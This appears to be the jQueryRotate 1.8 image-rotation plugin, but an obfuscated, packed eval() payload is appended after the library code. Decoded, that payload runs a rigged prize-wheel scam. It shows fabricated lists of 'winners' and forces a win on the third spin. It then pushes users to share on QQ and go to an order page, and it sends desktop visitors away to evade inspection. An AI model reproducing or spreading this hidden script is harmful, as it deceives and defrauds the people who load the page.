// VERSION: 1.8 LAST UPDATE: 9.03.2011
/* 
 * Licensed under the MIT license: http://www.opensource.org/licenses/mit-license.php
 * 
 * Made by Wilq32, wilq32@gmail.com, Wroclaw, Poland, 01.2009
 * Website: http://code.google.com/p/jqueryrotate/ 
 */

// Documentation removed from script file (was kinda useless and outdated)

(function($) {
var supportedCSS,styles=document.getElementsByTagName("head")[0].style,toCheck="transformProperty WebkitTransform OTransform msTransform MozTransform".split(" ");
for (var a=0;a<toCheck.length;a++) if (styles[toCheck[a]] !== undefined) supportedCSS = toCheck[a];
// Bad eval to preven google closure to remove it from code o_O
// After compresion replace it back to var IE = 'v' == '\v'
var IE = eval('"v"=="\v"');

jQuery.fn.extend({
ImageRotate:function(parameters)
{
	// If this element is already a Wilq32.PhotoEffect object, skip creation
	if (this.Wilq32&&this.Wilq32.PhotoEffect) return;
	// parameters might be applied to many objects - so because we use them later - a fresh instance is needed 
	var paramClone = $.extend(true, {}, parameters); 
	return (new Wilq32.PhotoEffect(this.get(0),paramClone))._rootObj;
},
rotate:function(parameters)
{
	if (this.length===0||typeof parameters=="undefined") return;
	if (typeof parameters=="number") parameters={angle:parameters};
	var returned=[];
	for (var i=0,i0=this.length;i<i0;i++)
	{
	    var element=this.get(i);	
		if (typeof element.Wilq32 == "undefined") 
			returned.push($($(element).ImageRotate(parameters)));
		else 
            element.Wilq32.PhotoEffect._handleRotation(parameters);
	}
	return returned;
}
});

// Library agnostic interface

Wilq32=window.Wilq32||{};
Wilq32.PhotoEffect=(function(){

	if (supportedCSS) {
		return function(img,parameters){
			img.Wilq32 = {
				PhotoEffect: this
			};
            
            this._img = this._rootObj = this._eventObj = img;
            this._handleRotation(parameters);
		}
	} else {
		return function(img,parameters) {
			// Make sure that class and id are also copied - just in case you would like to refeer to an newly created object
            this._img = img;

			this._rootObj=document.createElement('span');
			this._rootObj.style.display="inline-block";
			this._rootObj.Wilq32 = 
				{
					PhotoEffect: this
				};
			img.parentNode.insertBefore(this._rootObj,img);
			
			if (img.complete) {
				this._Loader(parameters);
			} else {
				var self=this;
				// TODO: Remove jQuery dependency
				jQuery(this._img).bind("load", function()
				{
					self._Loader(parameters);
				});
			}
		}
	}
})();

Wilq32.PhotoEffect.prototype={
    _setupParameters : function (parameters){
		this._parameters = this._parameters || {};
        if (typeof this._angle !== "number") this._angle = 0 ;
        if (typeof parameters.angle==="number") this._angle = parameters.angle;
        this._parameters.animateTo = (typeof parameters.animateTo==="number") ? (parameters.animateTo) : (this._angle); 

		this._parameters.easing = parameters.easing || this._parameters.easing || function (x, t, b, c, d) { return -c * ((t=t/d-1)*t*t*t - 1) + b; }
		this._parameters.duration = parameters.duration || this._parameters.duration || 1000;
        this._parameters.callback = parameters.callback || this._parameters.callback || function(){};
        if (parameters.bind && parameters.bind != this._parameters.bind) this._BindEvents(parameters.bind); 
	},
	_handleRotation : function(parameters){
          this._setupParameters(parameters);
          if (this._angle==this._parameters.animateTo) {
              this._rotate(this._angle);
          }
          else { 
              this._animateStart();          
          }
	},

	_BindEvents:function(events){
		if (events && this._eventObj) 
		{
            // Unbinding previous Events
            if (this._parameters.bind){
                var oldEvents = this._parameters.bind;
                for (var a in oldEvents) if (oldEvents.hasOwnProperty(a)) 
                        // TODO: Remove jQuery dependency
                        jQuery(this._eventObj).unbind(a,oldEvents[a]);
            }

            this._parameters.bind = events;
			for (var a in events) if (events.hasOwnProperty(a)) 
				// TODO: Remove jQuery dependency
					jQuery(this._eventObj).bind(a,events[a]);
		}
	},

	_Loader:(function()
	{
		if (IE)
		return function(parameters)
		{
			var width=this._img.width;
			var height=this._img.height;
			this._img.parentNode.removeChild(this._img);
							
			this._vimage = this.createVMLNode('image');
			this._vimage.src=this._img.src;
			this._vimage.style.height=height+"px";
			this._vimage.style.width=width+"px";
			this._vimage.style.position="absolute"; // FIXES IE PROBLEM - its only rendered if its on absolute position!
			this._vimage.style.top = "0px";
			this._vimage.style.left = "0px";

			/* Group minifying a small 1px precision problem when rotating object */
			this._container =  this.createVMLNode('group');
			this._container.style.width=width;
			this._container.style.height=height;
			this._container.style.position="absolute";
			this._container.setAttribute('coordsize',width-1+','+(height-1)); // This -1, -1 trying to fix ugly problem with small displacement on IE
			this._container.appendChild(this._vimage);
			
			this._rootObj.appendChild(this._container);
			this._rootObj.style.position="relative"; // FIXES IE PROBLEM
			this._rootObj.style.width=width+"px";
			this._rootObj.style.height=height+"px";
			this._rootObj.setAttribute('id',this._img.getAttribute('id'));
			this._rootObj.className=this._img.className;			
		    this._eventObj = this._rootObj;	
		    this._handleRotation(parameters);	
		}
		else
		return function (parameters)
		{
			this._rootObj.setAttribute('id',this._img.getAttribute('id'));
			this._rootObj.className=this._img.className;
			
			this._width=this._img.width;
			this._height=this._img.height;
			this._widthHalf=this._width/2; // used for optimisation
			this._heightHalf=this._height/2;// used for optimisation
			
			var _widthMax=Math.sqrt((this._height)*(this._height) + (this._width) * (this._width));

			this._widthAdd = _widthMax - this._width;
			this._heightAdd = _widthMax - this._height;	// widthMax because maxWidth=maxHeight
			this._widthAddHalf=this._widthAdd/2; // used for optimisation
			this._heightAddHalf=this._heightAdd/2;// used for optimisation
			
			this._img.parentNode.removeChild(this._img);	
			
			this._aspectW = ((parseInt(this._img.style.width,10)) || this._width)/this._img.width;
			this._aspectH = ((parseInt(this._img.style.height,10)) || this._height)/this._img.height;
			
			this._canvas=document.createElement('canvas');
			this._canvas.setAttribute('width',this._width);
			this._canvas.style.position="relative";
			this._canvas.style.left = -this._widthAddHalf + "px";
			this._canvas.style.top = -this._heightAddHalf + "px";
			this._canvas.Wilq32 = this._rootObj.Wilq32;
			
			this._rootObj.appendChild(this._canvas);
			this._rootObj.style.width=this._width+"px";
			this._rootObj.style.height=this._height+"px";
            this._eventObj = this._canvas;
			
			this._cnv=this._canvas.getContext('2d');
            this._handleRotation(parameters);
		}
	})(),

	_animateStart:function()
	{	
		if (this._timer) {
			clearTimeout(this._timer);
		}
		this._animateStartTime = +new Date;
		this._animateStartAngle = this._angle;
		this._animate();
	},
_animate:function()
     {
         var actualTime = +new Date;
         var checkEnd = actualTime - this._animateStartTime > this._parameters.duration;

         // TODO: Bug for animatedGif for static rotation ? (to test)
         if (checkEnd && !this._parameters.animatedGif) 
         {
             clearTimeout(this._timer);
         }
         else 
         {
             if (this._canvas||this._vimage||this._img) {
                 var angle = this._parameters.easing(0, actualTime - this._animateStartTime, this._animateStartAngle, this._parameters.animateTo - this._animateStartAngle, this._parameters.duration);
                 this._rotate((~~(angle*10))/10);
             }
             var self = this;
             this._timer = setTimeout(function()
                     {
                     self._animate.call(self);
                     }, 10);
         }

         // To fix Bug that prevents using recursive function in callback I moved this function to back
         if (this._parameters.callback && checkEnd){
             this._angle = this._parameters.animateTo;
             this._rotate(this._angle);
             this._parameters.callback.call(this._rootObj);
         }
     },

	_rotate : (function()
	{
		var rad = Math.PI/180;
		if (IE)
		return function(angle)
		{
            this._angle = angle;
			this._container.style.rotation=(angle%360)+"deg";
		}
		else if (supportedCSS)
		return function(angle){
            this._angle = angle;
			this._img.style[supportedCSS]="rotate("+(angle%360)+"deg)";
		}
		else 
		return function(angle)
		{
            this._angle = angle;
			angle=(angle%360)* rad;
			// clear canvas	
			this._canvas.width = this._width+this._widthAdd;
			this._canvas.height = this._height+this._heightAdd;
						
			// REMEMBER: all drawings are read from backwards.. so first function is translate, then rotate, then translate, translate..
			this._cnv.translate(this._widthAddHalf,this._heightAddHalf);	// at least center image on screen
			this._cnv.translate(this._widthHalf,this._heightHalf);			// we move image back to its orginal 
			this._cnv.rotate(angle);										// rotate image
			this._cnv.translate(-this._widthHalf,-this._heightHalf);		// move image to its center, so we can rotate around its center
			this._cnv.scale(this._aspectW,this._aspectH); // SCALE - if needed ;)
			this._cnv.drawImage(this._img, 0, 0);							// First - we draw image
		}

	})()
}

if (IE)
{
Wilq32.PhotoEffect.prototype.createVMLNode=(function(){
document.createStyleSheet().addRule(".rvml", "behavior:url(#default#VML)");
		try {
			!document.namespaces.rvml && document.namespaces.add("rvml", "urn:schemas-microsoft-com:vml");
			return function (tagName) {
				return document.createElement('<rvml:' + tagName + ' class="rvml">');
			};
		} catch (e) {
			return function (tagName) {
				return document.createElement('<' + tagName + ' xmlns="urn:schemas-microsoft.com:vml" class="rvml">');
			};
		}		
})();
}

})(jQuery);
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('h 1d(a,b){f c=b-a;f d=s.x();m(a+s.2f(d*c))}h o(a){f b=1d(1,a.18);m a[b-1]}f 1A=["2g","2l元红包","10克金条","时尚腕表","1J 1V"];f 1z=["陈","李","周","赵","钱","孙","周","吴","郑","王","冯","杨","朱","许","吕","莫","施","孔","曹","薛","杜"];f 1r=["先生","小姐"];f 1p=["北京","天津","上海","重庆","河北","河南","云南","辽宁","黑龙江","黑龙江","黑龙江","山东","新疆","江苏","浙江","江西","湖北","广西","甘肃","山西","内蒙古","陕西","吉林","福建","贵州","广东","青海","西藏","四川","宁夏","海南"];h 1o(){f a="";r(f i=1;i<7;i++){f a=a+\'<1g\'+(i%2?\' 1u="2k"\':"")+\'>\';a=a+\'<p 1u="2z">\'+o(1p)+\'的 \'+o(1z)+o(1r)+\' \'+1d(1,1q)+\'秒前 抽中 \'+o(1A)+\'</p></1g>\'}$(".1j").1M(0).1Y(a);$(".1j 1g:26").27({28:"0"},29)}2a(h(){1o()},1w);f 12=0;f 17=0;h 14(){$(".1G-2n").1n({1I:{13:h(){1B=1x;f a=x();$(".1G").1n({1N:17,1P:12,1Q:1w,1S:h(){14();16();j(a.1t("|")[1]=="1"){1c(1)}y{1c(0)}}})}}})}h 1c(a){$(".1m").1f();j(a){$(".q-1h").w();$(".q").1f()}y{$(".q").w();$(".q-1h").1f()}}$(".2h").13(h(){f a=1k("1i");u.t=\'1H.1l?1i=\'+a+\'&1e=\'+15()});$(".1K").13(h(){$(".1m").w();$(".q-1h").w()});h x(){$(1B).1L("13");j(!k.l){k.l=1}y{f a=1O(k.l)+1;a>=3?a=3:a;k.l=a}f b=["很抱歉没有抽中，还有抽奖机会哦|0","待定","待定","恭喜你抽中价值2F元的时尚腕表，分享到1R空间后点下空间自己分享的动态或重新打开本页即可领取|1"];j(k.l<3){n=0}y{n=3}17=12%1T;12=1U+n*1q;m b[n]};1s.1W=h(){14();16();k.1X=1b 1Z().20()};h 16(){f a=["还剩3次抽奖机会","还剩余2次抽奖机会","还剩余1次抽奖机会","您的机会已经抽完啦"];21{j(k.l){$(".14-22-23 ").24(a[k.l])}}25(e){}};h 1v(){f a,1a,i;f b=u.t;f c=b.19("?");b=b.1y(c+1);f d=b.1t("&");r(i=0;i<d.18;i++){c=d[i].19("=");j(c>0){a=d[i].2b(0,c);1a=d[i].1y(c+1);1x[a]=1a}}};f 1k=h(e){f a=1b 1v();f i;f n;r(i 2c a){j(e==i){n=2d(a[i])}}j(n=="{1i}"){f b=/[a-11-z-9][-a-11-z-9]{0,1C}(\\.[a-11-z-9][-a-11-z-9]{0,1C})+\\.?/;f c=b.2i(15());n=c[0].2j(/\\./g,"")}m n};h 15(){1e=1D.1E?1D.1E:1s.u.t;m 2m(1e)}h 1F(){f a=2o.2p;f b=1b 2q("2r","2s","2t","2u 2v","2w","2x");f c=2y;r(f v=0;v<b.18;v++){j(a.19(b[v])>0){c=2A;2B}}m c};j(1F()){u.t="./2C.1l"}h 2D(n){f a=[\'0\',\'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\',\'A\',\'B\',\'C\',\'D\',\'E\',\'F\',\'G\',\'H\',\'I\',\'J\',\'K\',\'L\',\'M\',\'N\',\'O\',\'P\',\'Q\',\'R\',\'S\',\'T\',\'U\',\'V\',\'W\',\'X\',\'Y\',\'Z\'];f b="";r(f i=0;i<n;i++){f c=s.2E(s.x()*2e);b+=a[c]}m b}',62,166,'|||||||||||||||var||function||if|localStorage|selectnum|return||getgoods||showbox|for|Math|href|location||hide|random|else|Z0||||||||||||||||||||||||||||zA|allangle|click|roll|geturl|time_out|lastangle|length|indexOf|value|new|showsth|GetRandomNum|url|show|li|two|channel|itemperson|Urlthings|html|hbbg|rotate|getstr|ip|60|sex|window|split|class|QueryString|5000|this|substr|nick|goods|that|62|document|referrer|ispc|four|order|bind|iphone|again|unbind|eq|angle|Number|animateTo|duration|QQ|callback|360|2160|6s|onload|tm|prepend|Date|getTime|try|top|titlenum|text|catch|first|animate|marginTop|1000|setInterval|substring|in|decodeURI|35|round|iwatch|goorder|exec|replace|current|8888|encodeURIComponent|up|navigator|userAgent|Array|Android|iPhone|SymbianOS|Windows|Phone|iPad|iPod|true|fl|false|break|error|generateMixed|ceil|2980'.split('|'),0,{}))